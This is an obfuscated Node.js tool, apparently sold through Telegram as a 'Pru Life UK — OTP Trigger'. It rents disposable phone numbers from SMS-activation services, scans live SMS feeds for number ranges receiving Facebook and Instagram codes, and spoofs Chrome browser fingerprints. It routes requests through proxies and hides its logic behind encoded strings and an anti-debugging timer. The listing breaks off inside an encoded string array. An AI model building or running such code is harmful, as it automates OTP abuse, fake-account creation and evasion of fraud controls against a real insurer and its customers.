const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v26) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v27 = {};
      v27.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v27), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v28) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(0x1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent");
const {
  SocksProxyAgent
} = require("socks-proxy-agent");
function debugLog(v29, v30, v31) {
  try {
    const v32 = new Date().toISOString(),
      v33 = '[' + v32 + "] [" + v29 + "] [" + v30 + ']\x0a' + (typeof v31 === "object" ? JSON.stringify(v31, null, 0x2) : String(v31)) + '\x0a' + '─'.repeat(0x50) + '\x0a';
    fs.appendFileSync("debug.txt", v33, "utf8");
  } catch (v34) {}
}
const B = chalk.hex("#ED1B2D"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  process.stdout.write("[2J[3J[H");
  console.log(B("    ____  ____  __  __   __    ________ _____  ")), console.log(B("   / __ \\/ __ \\/ / / /  / /   /  _/ ____/ ____/ ")), console.log(C("  / /_/ / /_/ / / / /  / /    / // /_  / __/    ")), console.log(C(" / ____/ _, _/ /_/ /  / /____/ // __/ / /___    ")), console.log(Y("/_/   /_/ |_|\\____/  /_____/___/_/   /_____/    \n")), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
  console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
  console.log(W("│ [•] Target    : ") + Y("Pru Life UK — OTP Trigger    ") + W('│')), console.log(W("│ [•] Version   : ") + B("PRU-V1.0.0                   ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
class NexaRateLimiter {
  constructor(v35) {
    this.delayMs = v35;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v36) {
    return new Promise((v37, v38) => {
      this.queue.push(async () => {
        try {
          v37(await v36());
        } catch (v39) {
          v38(v39);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v40 = this.queue.shift();
      await v40(), await new Promise(v41 => setTimeout(v41, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt");
(function () {
  let v42;
  try {
    const v43 = Function("return (function() {}.constructor(\"return this\")( ));");
    v42 = v43();
  } catch (v44) {
    v42 = window;
  }
  v42.setInterval(fn2, 0xdac);
})();
const SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v45) {
  return new Promise((v46, v47) => {
    const v48 = {};
    v48.Accept = "text/plain", v48.Connection = "close";
    const v49 = {};
    v49.hostname = "smsbower.page", v49.port = 0x1bb, v49.path = "/stubs/handler_api.php?" + v45, v49.method = "GET", v49.headers = v48;
    const v50 = v49,
      v51 = https.request(v50, v52 => {
        let v53 = '';
        v52.on("data", v54 => v53 += v54);
        v52.on("end", () => v46(v53.trim()));
      });
    v51.on("error", v55 => v47(new Error("SmsBower net: " + v55.message))), v51.setTimeout(0x3a98, () => {
      v51.destroy(), v47(new Error("SmsBower timeout"));
    }), v51.end();
  });
}
function smsBowerFetchNumber(v56, v57, v58, v59) {
  let v60 = "api_key=" + encodeURIComponent(v56) + "&action=getNumber&service=" + encodeURIComponent(v57 || 'fb');
  v58 && String(v58).trim() !== '0' && String(v58).trim() !== '' && (v60 += "&country=" + encodeURIComponent(v58));
  v59 && parseFloat(v59) > 0x0 && (v60 += "&maxPrice=" + encodeURIComponent(v59));
  return smsBowerRequest(v60).then(v61 => {
    if (v61.startsWith("ACCESS_NUMBER:")) {
      const v62 = v61.split(':');
      return {
        'activationId': v62[0x1],
        'phoneNumber': v62[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v61);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v63, v64) {
  return new Promise((v65, v66) => {
    const v67 = {};
    v67.range = v64;
    v67.is_national = false, v67.remove_plus = false;
    const v68 = JSON.stringify(v67),
      v69 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v63,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v68)
        }
      },
      v70 = https.request(v69, v71 => {
        let v72 = '';
        v71.on("data", v73 => v72 += v73), v71.on("end", () => {
          try {
            const v74 = JSON.parse(v72);
            if (v74?.["meta"]?.["code"] === 0xc8 && v74?.["data"]?.["full_number"]) v65(v74.data.full_number.replace(/[^0-9]/g, ''));else v66(new Error(v74?.["message"] || "Zenex: no number"));
          } catch (v75) {
            v66(new Error("Zenex: invalid JSON"));
          }
        });
      });
    v70.on("error", v76 => v66(new Error("Zenex net: " + v76.message))), v70.setTimeout(0x3a98, () => {
      v70.destroy();
      v66(new Error("Zenex timeout"));
    });
    v70.write(v68);
    v70.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(0x1f4);
function stripRid(v77) {
  return v77.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v78, v79, v80) {
  return new Promise((v81, v82) => {
    const v83 = stripRid(v79),
      v84 = {};
    v84.rid = v83;
    const v85 = JSON.stringify(v84),
      v86 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v80,
        'method': "POST",
        'headers': {
          'mauthapi': v78,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v85)
        }
      },
      v87 = https.request(v86, v88 => {
        let v89 = '';
        v88.on("data", v90 => v89 += v90), v88.on("end", () => {
          try {
            const v91 = JSON.parse(v89);
            if (v91?.["meta"]?.["code"] === 0xc8 && v91?.["data"]?.["no_plus_number"]) v81(v91.data.no_plus_number);else v82(new Error(v91?.["message"] || v91?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v92) {
            v82(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v87.on("error", v93 => v82(new Error("2oo9 network: " + v93.message))), v87.setTimeout(0x2710, () => {
      v87.destroy();
      v82(new Error("2oo9: Timeout"));
    }), v87.write(v85), v87.end();
  });
}
function twoOoFetchConsole(v94, v95) {
  return new Promise((v96, v97) => {
    const v98 = {};
    v98.mauthapi = v94;
    const v99 = {};
    v99.hostname = "api.2oo9.cloud", v99.port = 0x1bb, v99.path = v95, v99.method = "GET", v99.headers = v98;
    const v100 = v99;
    const v101 = https.request(v100, v102 => {
      let v103 = '';
      v102.on("data", v104 => v103 += v104);
      v102.on("end", () => {
        try {
          const v105 = JSON.parse(v103);
          if (v105?.["meta"]?.["code"] === 0xc8 && Array.isArray(v105?.["data"]?.["hits"])) v96(v105.data.hits);else v97(new Error(v105?.["message"] || "Console fetch failed"));
        } catch (v106) {
          v97(new Error("Console: Invalid JSON"));
        }
      });
    });
    v101.on("error", v107 => v97(new Error("Console network: " + v107.message)));
    v101.setTimeout(0x2710, () => {
      v101.destroy();
      v97(new Error("Console timeout"));
    }), v101.end();
  });
}
function parseTwoOoRangeSelection(v108, v109) {
  const v110 = new Set();
  const v111 = v108.split(/[\s,]+/).filter(v112 => v112);
  for (const v113 of v111) {
    const v114 = v113.match(/^(\d+)-(\d+)$/);
    if (v114) for (let v115 = +v114[0x1]; v115 <= +v114[0x2]; v115++) {
      if (v115 >= 0x1 && v115 <= v109) v110.add(v115 - 0x1);
    } else {
      const v116 = parseInt(v113);
      if (!isNaN(v116) && v116 >= 0x1 && v116 <= v109) v110.add(v116 - 0x1);
    }
  }
  return [...v110].sort((v117, v118) => v117 - v118);
}
async function autoRangeFinderFor2Oo(v119, v120, v121, v122) {
  const v123 = {};
  v123.facebook = ["facebook", 'fb'], v123.instagram = ["instagram", 'ig'], v123.meta = ["meta"], v123.all = ["facebook", 'fb', "instagram", 'ig', "meta", "pru", 'ph'];
  const v124 = v123,
    v125 = {};
  v125.facebook = "📘 Facebook", v125.instagram = "📸 Instagram", v125.meta = "🌐 Meta", v125.all = "📦 All";
  const v126 = v125;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v127 = [];
  try {
    v127 = await twoOoFetchConsole(v119, v120);
  } catch (v140) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v140.message + '\x0a')), null;
  }
  const v128 = v127.slice(0x0, 0x64);
  if (v128.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v129 = {};
  v129.name = "📘 Facebook", v129.value = "facebook";
  const v130 = {};
  v130.name = "📸 Instagram", v130.value = "instagram";
  const v131 = {};
  v131.name = "🌐 Meta", v131.value = "meta";
  const v132 = {};
  v132.name = "📦 All", v132.value = "all";
  const v133 = await v121("Filter by app:", [v129, v130, v131, v132]),
    v134 = v124[v133],
    v135 = v128.filter(v141 => {
      const v142 = (v141.sid || '').toLowerCase(),
        v143 = (v141.message || '').toLowerCase();
      return v134.some(v144 => v142.includes(v144) || v143.includes(v144));
    });
  if (v135.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v136 = {},
    v137 = {};
  for (const v145 of v135) {
    const v146 = v145.range || '';
    if (!v146) continue;
    v136[v146] = (v136[v146] || 0x0) + 0x1;
    const v147 = {};
    v147.facebook = 0x0, v147.instagram = 0x0, v147.meta = 0x0, v137[v146] = v137[v146] || v147;
    if (v124.facebook.some(v148 => (v145.sid || '').toLowerCase().includes(v148) || (v145.message || '').toLowerCase().includes(v148))) v137[v146].facebook++;
    if (v124.instagram.some(v149 => (v145.sid || '').toLowerCase().includes(v149) || (v145.message || '').toLowerCase().includes(v149))) v137[v146].instagram++;
    if (v124.meta.some(v150 => (v145.sid || '').toLowerCase().includes(v150) || (v145.message || '').toLowerCase().includes(v150))) v137[v146].meta++;
  }
  const v138 = Object.entries(v136).sort((v151, v152) => v152[0x1] - v151[0x1]).slice(0x0, 0x5);
  if (v138.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v139 = await v121("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v139 === "auto") {
    const [v153, v154] = v138[0x0],
      v155 = v137[v153] || {},
      v156 = [];
    if (v155.facebook) v156.push("📘FB(" + v155.facebook + ')');
    if (v155.instagram) v156.push("📸IG(" + v155.instagram + ')');
    if (v155.meta) v156.push("🌐Meta(" + v155.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v153 + "  (" + v154 + " hits)  " + v156.join('\x20') + '\x0a')), [v153];
  } else {
    console.log(chalk.cyan("\n  App: " + v126[v133] + "  |  Scanned: " + v135.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v138.forEach(([v160, v161], v162) => {
      const v163 = v137[v160] || {},
        v164 = [];
      if (v163.facebook) v164.push("📘FB(" + v163.facebook + ')');
      if (v163.instagram) v164.push("📸IG(" + v163.instagram + ')');
      if (v163.meta) v164.push("🌐Meta(" + v163.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v162 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v160.padEnd(0x10)) + chalk.yellow(String(v161).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v161, 0xc)) + '\x20\x20') + (v164.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v157 = await v122("Select ranges:", ''),
      v158 = parseTwoOoRangeSelection(v157, v138.length);
    if (v158.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v159 = v158.map(v165 => v138[v165][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v159.join(',\x20') + '\x0a')), v159;
  }
}
function nexaFetchNumber(v166, v167, v168) {
  return new Promise((v169, v170) => {
    const v171 = {};
    v171.range = v167, v171.format = "normal";
    const v172 = JSON.stringify(v171),
      v173 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v168 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v166,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v172)
        }
      },
      v174 = http.request(v173, v175 => {
        let v176 = '';
        v175.on("data", v177 => v176 += v177), v175.on("end", () => {
          try {
            const v178 = JSON.parse(v176);
            v178.success && v178.number ? v169(v178.number.replace(/[^0-9]/g, '')) : v170(new Error(v178.error || "NexaOTP: No number returned"));
          } catch (v179) {
            v170(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v174.on("error", v180 => v170(new Error("NexaOTP network: " + v180.message)));
    v174.setTimeout(0x2710, () => {
      v174.destroy(), v170(new Error("NexaOTP: Timeout"));
    }), v174.write(v172), v174.end();
  });
}
function normalizePhoneNumber(v181) {
  let v182 = v181.trim().replace(/[^0-9]/g, '');
  if (v182.startsWith('09') && v182.length === 0xb) v182 = '63' + v182.substring(0x1);else {
    if (v182.startsWith('9') && v182.length === 0xa) v182 = '63' + v182;else {
      if (v182.startsWith('63') && v182.length === 0xc) {}
    }
  }
  return v182;
}
const v1 = {};
v1.v = 0x7e, v1.buildMin = 0x194e, v1.buildMax = 0x1984, v1.grease = "\"Not/A)Brand\";v=\"8\"";
const v2 = {};
v2.v = 0x7f, v2.buildMin = 0x1985, v2.buildMax = 0x19d4, v2.grease = "\"Not)A;Brand\";v=\"99\"";
const v3 = {};
v3.v = 0x80;
v3.buildMin = 0x19d5, v3.buildMax = 0x1a0b, v3.grease = "\"Not;A=Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x81, v4.buildMin = 0x1a0c, v4.buildMax = 0x1a42, v4.grease = "\"Not=A?Brand\";v=\"8\"";
const v5 = {};
v5.v = 0x82, v5.buildMin = 0x1a43, v5.buildMax = 0x1a79, v5.grease = "\"Not?A_Brand\";v=\"99\"";
const v6 = {};
v6.v = 0x83, v6.buildMin = 0x1a7a, v6.buildMax = 0x1ab1, v6.grease = "\"Not_A Brand\";v=\"24\"";
const v7 = {};
v7.v = 0x84, v7.buildMin = 0x1ab2, v7.buildMax = 0x1b1e, v7.grease = "\"Not A(Brand\";v=\"8\"";
const v8 = {};
v8.v = 0x85, v8.buildMin = 0x1b1f, v8.buildMax = 0x1b55, v8.grease = "\"Not(A;Brand\";v=\"99\"";
const v9 = {};
v9.v = 0x86, v9.buildMin = 0x1b56, v9.buildMax = 0x1b88, v9.grease = "\"Not;A)Brand\";v=\"24\"";
const v10 = {};
v10.v = 0x87, v10.buildMin = 0x1b89, v10.buildMax = 0x1bbe, v10.grease = "\"Not)A=Brand\";v=\"8\"";
function fn1() {
  const v183 = ['ig51BwjLCNmUlI4', 'qwDLBNq', 'nZy2mta4rxbbA3L4', 'BMPpruO', 'B1vyv00', 'CMvHzezPBgvtEw5J', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'ig51BwjLCNmP', 'ntaGvgHYzwfKCYaOrMfZDcK', 'v3zNqK8', '4PYtifjLC2vUzcaGoIbeAxnHyMXLzcaOu2LUz2XLifnLBMqPcG', 'DhrJC2LKpq', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'ze51teO', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'rMLSDgvYigj5igfWCdO', 'tefIA1K', 'DgHYzwfKCW', 'CMn1B2O', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 't1rqu2vUDa', 'sfDSyKu', 'CMLK', 'y2HHAw4', 'g1SWBsa', 'zMLSDgvY', 'Dw5SAw5Ru3LUyW', 'C29JA3m0', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'x3r0x2vUywjSzv9JB29RAwu9mq', 'BMv3', 'Axrhsgu', 'z3PPCa', 'icdILiiGia', 'zNvSBf9UDw1Izxi', 'BNvTyMvYC0zPBgu', 'uw9AEKu', 'l2fWAs92ms9UDw1IzxjZl3aZl2DLDa', 'Cgz2C3G', 'DgLTzw91Da', 'wZeVmv0', 'rfbgDNG', '8j+tMcbgywnLyM9VAW', 'vKryvNy', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', 'Aw5MBgf0zvn5BMm', 'Chj1BgLMzxvR', 'icaGicaGicaGicaGicaGicaGicaGica', 'rgHRu1K', 'C21ZrgvIDwC', 'yxbWx2LK', 'rw50zxiGy29VBgrVD24GyMv0D2vLBIbszxnLBMrZigLUihnLy29UzhmGw2rLzMf1Bhq6ide1xtO', 'xsdINjCGqwjVCNrPBMCG4OcuiduGy29UC2vJDxrPDMuGzMfPBhvYzxmUieXHC3qGzxjYB3i6ia', 'EwvSBg93', 'iK5VDf9biejYyw5KiJT2psiYnci', 'D29wDKO', 'Ehffuwi', 'Cgf0Ag5HBwu', 'r1zuEfu', 'Bwf4uhjPy2u', 'uNrntfi', 'mM9VotOGsw52ywXPzcbku09o', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'FhbYDwXPzMv1A3WXlJaUmhW', 't3jPz2LU', 'qwXXqxO', 'CMfUzg9TqNL0zxm', 'tfjKvNi', 'C2vSzwn0', 'txDcyMi', 'icaGifbSzwfZzsbJAgvJAYb5B3vYigLUDgvYBMv0ignVBM5Ly3rPB24GB3iGDhj5igfNywLUigXHDgvYlGO', 'iK5VDcbbkejYyw5KiJT2psi5osi', 'odeXndu3mgnzq1vPqW', 'sND3u1q', 'ihjHBMDLkhmPlIbbzgqGyw5VDgHLCJ8', 'rNvnANe', 'BMv4yunVBMzPzW', 'cIaG4PYxie5VigHPDhmGzM9YihnLBgvJDgvKigfWCc4k', 'CwD2uMy', 'sezJqwS', 'Cgf5Bg9Hza', 'ifnHzMfYAs81mZCUmZy', 'Ahr0Chm', 'D29YA2vYx3rOCMvHzhm', 'C3rHCNruAw1L', 'y2fSBa', 'rMfPBgvK', 'sM12Du0', 'ChjVEgLLCY50Ehq', 'u3vJy2vZC2z1Ba', 'Bwf0y2G', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', 'yxbWBgLJyxrPB24VANnVBG', '4PYtieXVywrLzca', 'ywjuBLq', 'id09pqO', 'zgf0yq', 'BwLU', 'BKLKufO', 'BvPhtw0', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYigLZign1CNjLBNrSEsb1BMrLCMDVAw5Nig1HAw50zw5HBMnLig9YigLZihvUCMvHy2HHyMXLlG', 'DKnOtue', 'Aungwuq', 'z3vUEMLWu3LUyW', 'DxnLCKfNzw50', 'x2DJBf9HDt0XlJeU', 'ruHwrwy', 'tLf4ufK', 'qMzXrwC', 'zw4TvvmSzw47Ct0WlJK', 'tg9wu20', 'CwnZrNC', 'sg93ig1HBNKGuMvZzw5KCYbWzxiGBNvTyMvYpYbBzgvMyxvSDdOGmL06', 'icdILzeGifn0yxr1CYa6ia', 'ANviwfG', 'jMnVDw50CNK9', 'igHPDhmk', 'ufjvlvyXlJaUmcaGicaGicaGicaGicaGicaGica', 'vxfszLO', 'yxjNDG', '4PscifVIGkjDief1DgHVCIaGica6ia', 'tw5XBfG', 'ihjHBMDLkhmPks4UlG', 'CuHWueG', 'Dg90ywXoDw1IzxjZ', 'yxbPs2v5', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'CLvzwKy', 'DM9SDhG', 'wfjhv1q', 'zvPzCMO', 'yMfZzty0', 'u3D4AMW', 'yxv0BW', 'wfLTzuy', 'y1rzqMO', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'z3jJvw4', 'iZu1ntu1nq', 'yNvPBgrnAw4', 'icaGg1SZm20', 'ze5msvy', 'iLDPBMrVD3mI', 'C2vHCMnO', 'CMvK', 'Cgf0Aa', 'rw50zxiGtMv4yu9uucbbueKGs2v5icH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'u2flwe8', 'Aw5OzxjPDa', 'mtm4nJC4yLjJB1bR', '4PYtifjLC2vUzcaGoIbfBMfIBgvKicG', 'w1nfvfvqxsbezxbLBMrLBMnPzxmGAw5ZDgfSBgvKihn1y2nLC3nMDwXSEsek', 'zKzNEgm', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'v29YA2vYia', 'u2vJluzLDgnOlu1Vzgu', 'ueTyBxe', 'zgvIDwCUDhH0', 'rMf0ywWGzxjYB3iGB24G', 'mteWnZm1mKXxB2HgCq', 'yKfkBLq', 'iK5VDdTbpujYyw5KiJT2psiYnci', 'EM1fuhq', 'qMHMDgq', 'tM8SigvUDgvYig5LDYbRzxK', 'u2vYDMvYideGkc9NzxqP', 'zgP0yxO', 'sM5Vuhm', 'DgnVtfC', 'icaGg1SZnM3INPqBwZm1Bsa', 'q291BNrYEsbJB2rLicHqsca9idqSidaGpsbHBNKPifTKzwzHDwX0oIaWxtO', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 'tK9uifjfr0Ltvevsruq', 'vhbeuxm', 'wMvUzxGGA2v5igzVDw5KicG', 'CgzIEMy', 'w1jLC2vUzca', 'CxvLDwu', 'q29UDgvUDc1uExbL', 'C3rHDgvpyMPLy3q', 'rw50zxiGy3vZDg9Tig51BwjLCIbVzIb0AhjLywrZicH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'lcaIr29Vz2XLienOCM9Tzsi7DJ0I', 'x3r0Cd0', 'zLfZzKq', 'CuPdzMq', 'ALjLA0S', 'CwPAt1e', 'zM9YBwf0', '8j+uHcbbDxrVifjLC2vUzcaXEcaOu2vUzcbpvfaGkYaXifjLC2vUzcb3AxrOihnHBwuGBgvHzgLKkq', 'suzSEvi', 'u3fuywG', 'iK5VDcLbpujYyw5KiJT2psi4iG', 'mJaGvgHYzwfKCYaOrgvMyxvSDcK', 'u2f2zsb0AgLZigTLEsbMB3iGzNv0DxjLihvZzt8', 'vw5RBM93BG', 'cIaGqxbWoIa', 'y2viu3e', 'mtq1DhDPv1rx', 'jgWWjgGW', 'y291BNrLCG', 'l2fWAs92zxjPzNK', 'qwrKzwqG', 'vg90ywWGvgLTzq', 'rw50zxiGy29VBgrVD24GyMvMB3jLifjLC2vUzcbPBIbZzwnVBMrZifTKzwzHDwX0oIaXnv06', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'zhv1tha', 'i0zgndq2nG', '4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'Ahr0Ca', 'rKfuquW6ieLUDMfSAwqGChjVEhKUiefIB3j0Aw5NihrVihbYzxzLBNqGsvaGBgvHAY4', 'AuncCK0', 'sg93ig1HBNKGBNvTyMvYCYb0BYbWCM9JzxnZpYaODhLWzsaNyMfJAYCGDg8Gz28GyMfJAYKGw2rLzMf1Bhq6iduWxtO', 'u0vmrunuifbst1HjrvmGrKLmrq', 'mtG4lJeZnY4XnZyUmtyZ', 'igHPDhmPica', 'x2DHpuDbms4ZlG', 'uvH5u2O', 'z2DUy1y', 'y2H6vei', 'twrdvui', 'rgXNENm', 'DezoBNG', 'i0zgnKiZnq', 'iK5VDd9bx0jYyw5KiJT2psi5osi', 'Dwjwvuy', 'CMfUzg9T', 'Be9ZB3u', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'CMfUz2u', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'iK5VDcHbo0jYyw5KiJT2psi4iG', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'CMfUz2vZ', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'cIaG4PYtifnLBgvJDgvKoIa', 'BwfW', 'CgfYC2u', 'D3rnqMq', 'zgvSyxLnCW', 'z3v0zK8', 'D2vArfC', 'D1bNrhe', 'C3rVCa', 'x3r3CgLKpxr3lG', '4QYf77IpieDViejHy2SGDg8GvgHYzwfKCYbtzwXLy3rPB24', 'g1SYsHTBsa', 'qwnJzxb0luXHBMD1ywDL', 'lIbbzgqGyw5VDgHLCJ8', 'zMLSzq', 'cIaG4PYxierPC2nVBM5Ly3rLzcbMCM9TieXPy2vUC2uGu2vYDMvYlIbfEgL0Aw5NlI4UcG', 'icaGif9Fx18Gif9Fx18Gif9FicbFxYaGif9FicaGif9Fx19Fx19Fif9Fx19Fica', 'vwzND1K', 'CMvZzw5KrgvSyxK', 'BMv4yw90ChnLCNzPy2uUy29T', 'ExbQDxq', '4PYfie9uucbeAxnWyxrJAgvK', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', 'vw5RBM93BKnqvq', 'qM5gqM4', 'rMvxDeO', 'te1XA3u', 'B1jyAfu', 'B3jPz2LUywW', 'cIaG4PYxifnLC3nPB24Gvg9Rzw4GBg9ZDc4GqwjVCNrPBMCUlI4k', 's1zQshy', 'Dgv4Dc9WBgfPBG', 'B2jQzwn0', 'wMvUzxG6ig5Vig51BwjLCG', 'Dg9tDhjPBMC', 'ELnfsgO', 'u2vJluzLDgnOlvnPDgu', 'uuLQA08', 'zw50CMLLCW', 'C2vYDMLJzq', 'y3PhD2O', 'zMfPBgvKlNr4Da', 'x2DPzd1hqteUmY4', '4QYf77IpieDViejHy2SGDg8GqvbjieTLEq', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'Bg9N', 'zM9YrwfJAa', 'zxHPDa', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'zgvMBgf0zq', 'uK1Owxe', 't1rq', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'lI4U', 'Eujuqxq', 'vxnLCI1bz2vUDa', 'mM9VotOGvgLTzw91Da', 'Dg9mB3DLCKnHC2u', 'BNvSBa', 'Chj1lxjLC2vUzc0', 'CMvSzwfZzq', 'mJq2otyYmeXqtKvctG', 'uunAwee', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'lJeU', 'iKnOCM9TAxvTiJT2psi', 'iK5VDd1bx0jYyw5KiJT2psi4iG', 'yMfUBMvK', 'l2v0yY9TywnOAw5LlwLK', 'lNr0lJiU', 'lI4Ukq', 'AgL0CW', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'rMfPBgvKig9Uia', 'zw5XDwv1zq', 'CfvkqNC', 'AxnFBMf0Aw9UywW', 'EuHpEKG', 'CM16sxK', 'uMvTB3zLihnHDMvKigTLEq', 'tMv4yu9uucbUzxr3B3jRoIa', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'Bw5osxG', 'yxbPlNPLBMv4BMv0D29YAY5JB20', 'Cg9YDa', 'Aw5PDa', 'rurwBeC', 'wMLpzwK', 'Ag9ZDa', 'iZG4odG4oa', 'CMvZzw5KxZe', 'zg93BG', 'vu56D0S', '8j+mKcbnzxrH', 'CM9xs3G', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'y3H3C2e', 'zw1WDhK', 'C2HPzNq', 'iokgUYbty3jHCgvYieTPBMC', 'BgvUz3rO', 'Dvr6EMO', 'svz4zNq', 'C3vJy2vZCW', '8j+mKcbbDxrVigzLDgnOigzYB20GtMv4yu9uucbqyw5LBa', 'vNjss2C', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'txbUvLm', 'u21ZqM93zxiGDgLTzw91Da', 'u0vmrunuierju1bbveniic8GuKvtru5eie1preu', '8j+uPsbbDxrVigzLDgnOigzYB20Gu3rLEcaOmM9VosK', 'sxzVBeK', 'mM9VotOGtM8GBNvTyMvY', 'zw5K', 